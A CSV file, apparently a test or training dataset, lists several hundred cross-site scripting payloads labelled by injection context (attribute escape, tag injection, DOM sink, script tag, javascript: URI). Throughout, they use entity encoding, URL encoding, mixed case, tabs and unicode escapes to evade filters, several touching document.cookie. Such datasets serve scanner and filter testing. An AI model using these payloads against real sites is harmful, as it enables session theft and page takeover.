payload,context
""" on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape
%3Cimg onrepeat=prompt(document.cookie)%3E,tag_injection
"document.body.innerHTML=""%3Cimg src=x onerror=prompt(document.cookie)%3E""",dom_sink
""" on&#101;rror=prompt('XSS') """,attribute_escape
"location.href=""javascr	ipt:confirm('XSS')""",dom_sink
""" oNrePeaT=aLerT(1) """,attribute_escape
%22><img onload=console.log(%27XSS%27)>,tag_injection
<imG oNenD=pRomPt(1)>,tag_injection
"' oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
%3Cimg onrepeat=confirm(document.domain)%3E,tag_injection
""" oNbeGin=alErt('XSS') """,attribute_escape
"""><img onend=confirm(1)>",tag_injection
<img onend=prompt(1)/>,tag_injection
<img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt('XSS')/>,tag_injection
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt('XSS')>,tag_injection
' oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape
"""><img onanimationiteration=prompt('XSS')>",tag_injection
"""><img onend=prompt(document.domain)>",tag_injection
<img onanimationiteration=confirm('XSS')>,tag_injection
<img onend=alert(%27XSS%27)/>,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt('XSS')>""",dom_sink
<img onanimationiteration=console.log(1)>,tag_injection
<script>console.log`1`</script>,script_injection
<img on&#97;nim&#97;tion&#101;nd=prompt('XSS')/>,tag_injection
J&#97;VasCriPt:ProMpt(doCumEnt.doMaiN),js_uri
""" onbegin=\u0061lert(document.domain) """,attribute_escape
<img on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
JavAscRipT:cOnsOle.loG(1),js_uri
""" onanimationstart=alert(1) """,attribute_escape
"""><Img onBegIn=ProMpt('XSS')>",tag_injection
"' onerror=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
j&#97;v&#97;script:void(consol&#101;.log(1)),js_uri
"<img onerror=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""><img onanimationend=alert(document.domain)>",tag_injection
"""><Img onBegIn=ProMpt(1)>",tag_injection
%22 onload=console.log(1) %22,attribute_escape
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
' onload=\u0061lert(1) ',attribute_escape
<imG oNenD=aLerT('XSS')>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(DocUmeNt.DomAin)>"")",dom_sink
eval(%22alert(%27XSS%27)%22),dom_sink
%3Cscript%3E/x/console.log(document.domain)%3C/script%3E,script_injection
' onanimationiteration=confirm(1) ',attribute_escape
"javascr	ipt:void(alert(String.fromCharCode(88,83,83)))",js_uri
"%3Cimg onerror=alert(String.fromCharCode(88,83,83))%3E",tag_injection
<imG oNrePeaT=aLerT(dOcuMenT.dOmaIn)/>,tag_injection
<img onrepeat=confirm('XSS')/>,tag_injection
""" onlo&#97;d=prompt(1) """,attribute_escape
"' onanimationiteration=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
%22><img onanimationiteration=confirm(%27XSS%27)>,tag_injection
""" on&#101;nd=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"%22 onrepeat=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
<script>prompt('XSS')</script>,script_injection
""" oNanImaTioNenD=cOnfIrm('XSS') """,attribute_escape
"""><Img onRepEat=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
<imG oNerRor=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
<img on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
' onr&#101;p&#101;&#97;t=confirm('XSS') ',attribute_escape
"""><img onrepeat=confirm(document.domain)>",tag_injection
"<script>/x/consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"""%3E%3Cimg onanimationstart=console.log(document.cookie)%3E",tag_injection
""" onanimationend=alert(location.hash) """,attribute_escape
%22 onfocus=confirm(1) autofocus=%22,attribute_escape
' onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
<imG oNanImaTioNenD=pRomPt('XSS')>,tag_injection
<script>/*/\u0061lert(document.domain)</script>,script_injection
' onend=confirm(1) ',attribute_escape
<img onanimationend=\u0061lert('XSS')>,tag_injection
<img onerror=prompt(document.domain)>,tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')/>,tag_injection
javascript:void(prompt(location.hash)),js_uri
<scRipT>pRomPt`DocUmeNt.DomAin`</ScrIpt>,script_injection
<img onbegin=console.log(document.domain)/>,tag_injection
""" onbegin=alert(location.hash) """,attribute_escape
%3Cimg onload=confirm(document.domain)%3E,tag_injection
""" onrepeat=\u0061lert(location.hash) """,attribute_escape
JavAscRipT:vOid(alErt(loCatIon.haSh)),js_uri
"""><img on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
%27 onend=console.log(document.domain) %27,attribute_escape
"<img onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%22><img onerror=console.log(document.cookie)>,tag_injection
%22 onfocus=alert(1) autofocus=%22,attribute_escape
""" on&#97;nim&#97;tion&#101;nd=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"""><Img onBegIn=ProMpt(doCumEnt.coOkiE)>",tag_injection
<img onload=prompt('XSS')/>,tag_injection
"' onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<img onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
""" onfocus=consol&#101;.log('XSS') &#97;utofocus=""",attribute_escape
%3Cscript%3E/x/confirm('XSS')%3C/script%3E,script_injection
' onload=alert(document.domain) ',attribute_escape
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(1) ',attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt('XSS')>",tag_injection
<scr	ipt>/x/console.log(document.domain)</scr	ipt>,script_injection
<img on&#101;nd=confirm(1)/>,tag_injection
%3Cimg onanimationend=confirm(document.domain)/%3E,tag_injection
%22 onbegin=alert(location.hash) %22,attribute_escape
' oNloAd=ConSolE.lOg(1) ',attribute_escape
"""><Img onLoaD=aLerT(dOcuMenT.dOmaIn)>",tag_injection
"<imG oNbeGin=prOmpT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
j&#97;vascript:\u0061lert(document.domain),js_uri
""" onanimationcancel=alert(document.domain) """,attribute_escape
"""%3E%3Cimg onerror=alert(document.cookie)%3E",tag_injection
%3Cimg onanimationcancel=alert(document.cookie)/%3E,tag_injection
"%3Cimg onbegin=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
""" on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
""" on&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt('XSS')>,tag_injection
"<img onerror=alert(String.fromCharCode(88,83,83))>",tag_injection
javascr	ipt:void(prompt(location.hash)),js_uri
%3Cscript%3Ealert`document.domain`%3C/script%3E,script_injection
"document.write(""%3Cimg src=x onerror=console.log(document.domain)%3E"")",dom_sink
"""><img onanimationstart=alert(String.fromCharCode(88,83,83))>",tag_injection
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink
"""><img onr&#101;p&#101;&#97;t=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%22 onrepeat=alert(location.hash) %22,attribute_escape
%22><img onerror=prompt(location.hash)>,tag_injection
' oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape
%3Cimg onanimationiteration=alert(location.hash)%3E,tag_injection
"<img onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
%22 onbegin=console.log(document.domain) %22,attribute_escape
<scRipT>cOnfIrm('XSS')</ScrIpt>,script_injection
%3Cimg onanimationstart=confirm(location.hash)%3E,tag_injection
"location.href=""javascript:console.log(document.domain)""",dom_sink
%22><img onanimationcancel=prompt(1)>,tag_injection
"""%3E%3Cimg onanimationiteration=prompt(document.cookie)%3E",tag_injection
""" oNfoCus=prOmpT(STriNg.FroMChArCOde(88,83,83)) AutOfoCus=""",attribute_escape
%3Cimg onanimationstart=prompt(location.hash)/%3E,tag_injection
"<img on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<imG oNerRor=alErt(loCatIon.haSh)>,tag_injection
' oNanImaTioNitEraTioN=pRomPt(DocUmeNt.CooKie) ',attribute_escape
%22><img onload=alert(1)>,tag_injection
"""><img onerror=\u0061lert(location.hash)>",tag_injection
%22><img onerror=confirm(location.hash)>,tag_injection
' onanimationstart=confirm(location.hash) ',attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
<scRipT>/*/pRomPt(DocUmeNt.CooKie)</ScrIpt>,script_injection
<img onanimationstart=alert(document.cookie)/>,tag_injection
"j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
<img onb&#101;gin=confirm(1)>,tag_injection
"<img onanimationend=alert(String.fromCharCode(88,83,83))>",tag_injection
""" onload=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
<img onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
' onrepeat=alert(document.cookie) ',attribute_escape
"""><img onbegin=console.log(document.cookie)>",tag_injection
"%22><img onend=prompt(String.fromCharCode(88,83,83))>",tag_injection
' oNloAd=ConSolE.lOg(LocAtiOn.HasH) ',attribute_escape
%22 onbegin=console.log(document.cookie) %22,attribute_escape
%3Cimg onanimationend=confirm(location.hash)%3E,tag_injection
"<img onr&#101;p&#101;&#97;t=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
%3Cimg onanimationstart=prompt(location.hash)%3E,tag_injection
<script>//prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
' onerror=prompt(location.hash) ',attribute_escape
<img onb&#101;gin=&#97;l&#101;rt('XSS')>,tag_injection
<imG oNanImaTioNenD=cOnsOle.loG(dOcuMenT.cOokIe)>,tag_injection
"%22><img onanimationstart=alert(String.fromCharCode(88,83,83))>",tag_injection
"""><img onanimationcancel=alert(document.cookie)>",tag_injection
"document.write(""<img src=x onerror=console.log(1)>"")",dom_sink
"document.body.innerHTML=""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>""",dom_sink
""" onanimationstart=\u0061lert(1) """,attribute_escape
<scRipT>cOnfIrm(1)</sCriPt>,script_injection
' onanimationcancel=alert(document.domain) ',attribute_escape
j&#97;v&#97;script:void(consol&#101;.log(loc&#97;tion.h&#97;sh)),js_uri
<scRipT>/*/cOnsOle.loG(dOcuMenT.cOokIe)</sCriPt>,script_injection
' on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
""" onr&#101;p&#101;&#97;t=prompt(1) """,attribute_escape
<imG oNanImaTioNstArt=prOmpT(dOcuMenT.cOokIe)>,tag_injection
<script>\u0061lert`location.hash`</script>,script_injection
%3Cscript%3Eprompt`document.domain`%3C/script%3E,script_injection
"<imG oNanImaTioNenD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
%3Cimg onbegin=console.log(document.cookie)/%3E,tag_injection
"' oNrePeaT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"<img on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
' oNanImaTioNstArt=coNfiRm('XSS') ',attribute_escape
' onend=console.log(location.hash) ',attribute_escape
"""%3E%3Cimg onbegin=confirm(location.hash)%3E",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
"""><img onr&#101;p&#101;&#97;t=confirm(1)>",tag_injection
""" onrepeat=\u0061lert('XSS') """,attribute_escape
""" oNrePeaT=pRomPt('XSS') """,attribute_escape
"""><img on&#97;nim&#97;tionst&#97;rt=confirm(1)>",tag_injection
"""><img onerror=console.log('XSS')>",tag_injection
%3Cimg onanimationiteration=alert(document.cookie)%3E,tag_injection
"""><img onanimationcancel=alert('XSS')>",tag_injection
' onr&#101;p&#101;&#97;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
"""><img onend=console.log(location.hash)>",tag_injection
' onerror=alert(1) ',attribute_escape
%27 onbegin=console.log(document.domain) %27,attribute_escape
"""><Img onRepEat=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
""" onanimationiteration=console.log(1) """,attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;)""",dom_sink
"<img onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"<imG oNanImaTioNitEraTioN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<scr	ipt>/*/alert(location.hash)</scr	ipt>,script_injection
%3Cimg onend=console.log(document.domain)%3E,tag_injection
"%22><img onerror=console.log(String.fromCharCode(88,83,83))>",tag_injection
"' oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
""" oNfoCus=coNsoLe.Log(loCatIon.haSh) auTofOcuS=""",attribute_escape
"""><img onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
%27 onend=confirm(document.domain) %27,attribute_escape
"""%3E%3Cimg onerror=prompt(document.domain)%3E",tag_injection
%27 onend=prompt(document.domain) %27,attribute_escape
j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.cooki&#101;),js_uri
<img onanimationend=\u0061lert(1)/>,tag_injection
"""%3E%3Cimg onanimationend=console.log('XSS')%3E",tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(1)>",tag_injection
""" onanimationstart=alert(document.cookie) """,attribute_escape
<scRipT>cOnfIrm`doCumEnt.coOkiE`</scRipT>,script_injection
<imG oNerRor=alErt(1)>,tag_injection
<imG oNbeGin=alErt(loCatIon.haSh)>,tag_injection
""" onanimationend=alert(document.domain) """,attribute_escape
<img onanimationstart=alert(%27XSS%27)>,tag_injection
""" oNfoCus=coNfiRm(DocUmeNt.CooKie) aUtoFocUs=""",attribute_escape
<img onanimationiteration=prompt(document.cookie)>,tag_injection
%3Cscript%3Eprompt(document.domain)%3C/script%3E,script_injection
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(1)""",dom_sink
%3Cimg onbegin=prompt(document.cookie)%3E,tag_injection
<scr	ipt>/x/prompt(1)</scr	ipt>,script_injection
<imG oNanImaTioNstArt=alErt(1)/>,tag_injection
<imG oNerRor=coNfiRm(1)>,tag_injection
"""%3E%3Cimg onload=prompt(document.cookie)%3E",tag_injection
"<img onanimationstart=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"document.body.innerHTML=""<img src=x onerror=alert(document.cookie)>""",dom_sink
"""><img onend=console.log(1)>",tag_injection
<imG oNerRor=alErt('XSS')>,tag_injection
<img onbegin=alert(document.domain)/>,tag_injection
<img onend=prompt('XSS')>,tag_injection
%22 onfocus=console.log(document.domain) autofocus=%22,attribute_escape
""" onload=console.log(document.cookie) """,attribute_escape
""" on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
""" onbegin=console.log(location.hash) """,attribute_escape
"""><Img onAniMatIonIteRatIon=prOmpT(dOcuMenT.dOmaIn)>",tag_injection
"""><img onanimationiteration=prompt(document.domain)>",tag_injection
javascr	ipt:prompt(document.cookie),js_uri
"""><Img onEnd=coNsoLe.Log(loCatIon.haSh)>",tag_injection
<scr	ipt>/*/prompt(1)</scr	ipt>,script_injection
"' oNenD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"location.href=""javascr	ipt:alert(1)""",dom_sink
<img onanimationiteration=\u0061lert(location.hash)>,tag_injection
"%27 onerror=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
"""><img onerror=alert(location.hash)>",tag_injection
%3Cimg onend=prompt(document.domain)/%3E,tag_injection
""" onload=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
<img onload=prompt(location.hash)>,tag_injection
"%22><img onload=console.log(String.fromCharCode(88,83,83))>",tag_injection
%22 onbegin=alert(document.cookie) %22,attribute_escape
"""><img onr&#101;p&#101;&#97;t=prompt('XSS')>",tag_injection
<scr	ipt>/x/console.log(document.cookie)</scr	ipt>,script_injection
"""%3E%3Cimg onanimationiteration=confirm(1)%3E",tag_injection
"LocAtiOn.HreF=""JavAscRipT:cOnfIrm(loCatIon.haSh)""",dom_sink
"setTimeout(""confirm(1)"",0)",dom_sink
"""><img on&#97;nim&#97;tion&#101;nd=confirm('XSS')>",tag_injection
""" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
<imG oNloAd=AleRt('XSS')/>,tag_injection
""" oNanImaTioNstArt=prOmpT('XSS') """,attribute_escape
' onb&#101;gin=&#97;l&#101;rt('XSS') ',attribute_escape
"""><Img onErrOr=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection
"""><Img onAniMatIonEnd=alErt(doCumEnt.coOkiE)>",tag_injection
<script>/x/console.log('XSS')</script>,script_injection
%22><img onbegin=confirm(%27XSS%27)>,tag_injection
"setTimeout(""prompt(document.domain)"",0)",dom_sink
<imG oNanImaTioNstArt=prOmpT(1)/>,tag_injection
<scRipT>/X/pRomPt(DocUmeNt.DomAin)</ScrIpt>,script_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(1)>"")",dom_sink
%3Cimg onanimationend=alert('XSS')/%3E,tag_injection
j&#97;vascr	ipt:alert('XSS'),js_uri
"""><img onrepeat=console.log(location.hash)>",tag_injection
<img onanimationstart=alert('XSS')/>,tag_injection
JavAscRipT:cOnfIrm('XSS'),js_uri
<script>/x/confirm(1)</script>,script_injection
<img on&#97;nim&#97;tion&#101;nd=consol&#101;.log(1)/>,tag_injection
<scRipT>/*/aLerT(dOcuMenT.dOmaIn)</sCriPt>,script_injection
""" onanimationcancel=alert(1) """,attribute_escape
"eval(""prompt('XSS')"")",dom_sink
javascript:void(console.log(location.hash)),js_uri
%27 onanimationend=prompt(location.hash) %27,attribute_escape
"j&#97;v&#97;script:consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
<script>/*/confirm('XSS')</script>,script_injection
<imG oNanImaTioNenD=cOnfIrm('XSS')/>,tag_injection
"location.href=""javascript:confirm(String.fromCharCode(88,83,83))""",dom_sink
"""><img onload=prompt(1)>",tag_injection
"<img onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"document.write(""%3Cimg src=x onerror=confirm(document.cookie)%3E"")",dom_sink
%27 onanimationstart=prompt(document.domain) %27,attribute_escape
<img onr&#101;p&#101;&#97;t=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%27 onanimationiteration=prompt(document.cookie) %27,attribute_escape
<img onbegin=confirm(1)/>,tag_injection
"<imG oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
<scRipT>cOnfIrm`'XSS'`</ScrIpt>,script_injection
javascript:void(confirm(%27XSS%27)),js_uri
"""%3E%3Cimg onanimationiteration=alert(location.hash)%3E",tag_injection
%3Cimg onanimationiteration=alert(1)/%3E,tag_injection
""" oNfoCus=prOmpT(dOcuMenT.cOokIe) auTofOcuS=""",attribute_escape
<imG oNanImaTioNitEraTioN=cOnsOle.loG('XSS')>,tag_injection
""" oNfoCus=prOmpT(dOcuMenT.dOmaIn) auTofOcuS=""",attribute_escape
' oNloAd=ConSolE.lOg(DocUmeNt.DomAin) ',attribute_escape
"""><img onanimationcancel=alert(String.fromCharCode(88,83,83))>",tag_injection
<img onend=alert('XSS')>,tag_injection
"""><Img onAniMatIonStaRt=ProMpt(doCumEnt.doMaiN)>",tag_injection
"%3Cscript%3Econfirm`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection
' onb&#101;gin=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
javascript:alert(location.hash),js_uri
document.write(%22<img src=x onerror=console.log(document.domain)>%22),dom_sink
"""><img onrepeat=console.log(document.cookie)>",tag_injection
"""><Img onRepEat=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
eval(%22confirm(%27XSS%27)%22),dom_sink
"<imG oNanImaTioNstArt=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
<script>console.log`document.cookie`</script>,script_injection
<imG oNerRor=alErt(doCumEnt.doMaiN)/>,tag_injection
""" onanimationend=console.log(location.hash) """,attribute_escape
"""><Img onBegIn=ConSolE.lOg(1)>",tag_injection
j&#97;vascr	ipt:confirm('XSS'),js_uri
"""><img onerror=console.log(String.fromCharCode(88,83,83))>",tag_injection
<imG oNrePeaT=cOnsOle.loG(1)>,tag_injection
<img onlo&#97;d=&#97;l&#101;rt(1)/>,tag_injection
<imG oNanImaTioNcaNceL=aLerT(lOcaTioN.hAsh)/>,tag_injection
<img onbegin=confirm(document.domain)/>,tag_injection
"' on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%22 onend=confirm(%27XSS%27) %22,attribute_escape
"""><img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img onanimationstart=\u0061lert('XSS')>",tag_injection
' on&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
""" onanimationend=alert(document.cookie) """,attribute_escape
"""><Img onAniMatIonIteRatIon=coNsoLe.Log(loCatIon.haSh)>",tag_injection
"""%3E%3Cimg onbegin=confirm('XSS')%3E",tag_injection
<imG oNrePeaT=cOnfIrm(doCumEnt.doMaiN)>,tag_injection
' oNanImaTioNstArt=coNsoLe.Log(doCumEnt.coOkiE) ',attribute_escape
%22><img onload=confirm(%27XSS%27)>,tag_injection
document.write(%22<img src=x onerror=prompt(location.hash)>%22),dom_sink
<scRipT>/X/aLerT(1)</ScrIpt>,script_injection
"""><img on&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%22><img onanimationiteration=alert(%27XSS%27)>,tag_injection
"setTimeout(""alert(1)"",0)",dom_sink
<img on&#97;nim&#97;tionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
""" onerror=\u0061lert('XSS') """,attribute_escape
' oNanImaTioNitEraTioN=cOnfIrm(loCatIon.haSh) ',attribute_escape
%22><img onanimationiteration=console.log(%27XSS%27)>,tag_injection
' onerror=alert(location.hash) ',attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=alert(1)%3E""",dom_sink
""" on&#101;nd=&#97;l&#101;rt(1) """,attribute_escape
"""%3E%3Cimg onend=confirm('XSS')%3E",tag_injection
%3Cimg onanimationiteration=prompt(document.cookie)/%3E,tag_injection
"<img onanimationstart=console.log(String.fromCharCode(88,83,83))/>",tag_injection
%3Cimg onbegin=alert(1)%3E,tag_injection
%3Cimg onanimationstart=prompt(1)/%3E,tag_injection
<scr	ipt>console.log(document.domain)</scr	ipt>,script_injection
<imG oNerRor=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
<imG oNenD=cOnfIrm(loCatIon.haSh)/>,tag_injection
"' onload=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
""" oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn) """,attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape
%27 onanimationend=confirm(location.hash) %27,attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
j&#97;v&#97;script:prompt('XSS'),js_uri
""" on&#97;nim&#97;tionst&#97;rt=confirm(1) """,attribute_escape
"""%3E%3Cimg onanimationiteration=prompt(1)%3E",tag_injection
"document.write(""<img src=x onerror=alert('XSS')>"")",dom_sink
"%3Cimg onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection
' onrepeat=confirm(location.hash) ',attribute_escape
"%3Cimg onend=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<img onanimationend=console.log(%27XSS%27)>,tag_injection
' onerror=console.log('XSS') ',attribute_escape
' onr&#101;p&#101;&#97;t=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
""" oNerRor=alErt(doCumEnt.doMaiN) """,attribute_escape
""" onb&#101;gin=prompt('XSS') """,attribute_escape
"""><Img onErrOr=ConSolE.lOg('XSS')>",tag_injection
"document.write(""%3Cimg src=x onerror=alert(document.domain)%3E"")",dom_sink
%22><img onanimationend=prompt(%27XSS%27)>,tag_injection
' on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(1) ',attribute_escape
<imG oNbeGin=coNsoLe.Log(1)>,tag_injection
<img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
"location.href=""javascript:confirm('XSS')""",dom_sink
javascript:prompt(document.cookie),js_uri
"location.href=""javascr	ipt:confirm(1)""",dom_sink
""" on&#101;nd=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
"eval(""alert(String.fromCharCode(88,83,83))"")",dom_sink
"""><Img onAniMatIonEnd=coNsoLe.Log(loCatIon.haSh)>",tag_injection
<img onload=confirm(document.cookie)>,tag_injection
<scRipT>//coNfiRm(LocAtiOn.HasH)</scRipT>,script_injection
%3Cimg onbegin=prompt('XSS')/%3E,tag_injection
%3Cimg onanimationstart=confirm(document.cookie)%3E,tag_injection
<img onload=prompt(document.domain)>,tag_injection
<imG oNbeGin=coNfiRm('XSS')>,tag_injection
"""><img onlo&#97;d=confirm('XSS')>",tag_injection
%27 onanimationend=alert(%27XSS%27) %27,attribute_escape
j&#97;v&#97;script:void(confirm(docum&#101;nt.dom&#97;in)),js_uri
<img onbegin=prompt(location.hash)/>,tag_injection
' onanimationcancel=prompt('XSS') ',attribute_escape
<img onend=console.log(document.domain)>,tag_injection
<img onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
""" onb&#101;gin=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
"""><Img onLoaD=cOnfIrm(doCumEnt.doMaiN)>",tag_injection
' onend=alert(1) ',attribute_escape
""" onanimationiteration=alert(document.cookie) """,attribute_escape
<script>//consol&#101;.log(docum&#101;nt.cooki&#101;)</script>,script_injection
%22><img onanimationstart=prompt(document.cookie)>,tag_injection
"%22 onerror=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
"%22 onrepeat=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
""" onfocus=console.log(1) autofocus=""",attribute_escape
